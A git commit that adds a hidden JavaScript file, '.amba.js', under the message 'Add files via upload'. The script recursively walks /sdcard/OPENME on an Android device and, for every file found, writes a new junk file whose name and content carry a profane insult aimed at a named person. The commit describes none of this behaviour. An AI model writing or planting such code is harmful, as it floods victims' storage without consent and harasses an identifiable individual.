b4d23359df3e93c5ac4efd9a435b34bdf6779a60
ׅ🎀 AlinnUwU美しい ─ Script Developer✨ <zennloveit@gmail.com>
2026-04-16 16:48:01 +0700

    Add files via upload

---
+++ .amba.js
@@ -0,0 +1,19 @@
+import fs from "fs";
+import path from "path";
+
+let i = 1;
+
+const walk = (d) => {
+ fs.readdirSync(d, { withFileTypes: true }).forEach(x => {
+  let p = path.join(d, x.name);
+  if (x.isDirectory()) {
+   walk(p);
+  } else {
+   let ext = path.extname(p);
+   fs.writeFileSync(path.join(d, `Tanaka-Fuck-MR-ZeeoneGrayhat_${i}${ext}`), "Tanaka-Fuck-MR-ZeeoneGrayhat");
+   i++;
+  }
+ });
+};
+
+walk("/sdcard/OPENME");
